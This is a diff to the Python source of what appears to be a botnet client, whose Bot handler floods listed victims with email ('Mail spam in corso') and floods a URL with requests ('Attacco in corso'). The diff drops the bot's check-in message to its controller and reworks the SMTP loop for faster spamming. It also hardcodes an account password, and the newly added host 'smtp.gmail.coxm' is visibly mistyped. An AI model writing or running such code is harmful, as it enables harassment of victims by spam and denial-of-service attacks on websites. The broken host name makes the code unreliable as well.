@@ -31,10 +31,6 @@ def run():
     server = HTTPServer(('', 0), Bot)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((server_address[0], server_address[1]))
-    s.send(json.dumps({
-        'ip': s.getsockname()[0],
-        'port': server.server_port
-    }).encode('utf-8'))
     s.close()
     server.serve_forever()
 
@@ -109,6 +105,8 @@ class Bot(BaseHTTPRequestHandler):
         password = "cebqshlncuewhjso"
 
         self.set_current_action('Mail spam in corso', victims)
+        smtp_server = smtplib.SMTP_SSL('smtp.gmail.coxm', 465)
+        smtp_server.login(sender, password)
 
         for _ in range(number_of_emails):
             for victim in victims:
@@ -116,11 +114,9 @@ class Bot(BaseHTTPRequestHandler):
                 msg['Subject'] = obj
                 msg['From'] = sender
                 msg['To'] = victim
-                smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-                smtp_server.login(sender, password)
                 smtp_server.sendmail(sender, victim, msg.as_string())
-                smtp_server.quit()
         self.set_current_action()
+        smtp_server.quit()
 
     def request_spam(self, url, e):
         self.set_current_action('Attacco in corso', [url])
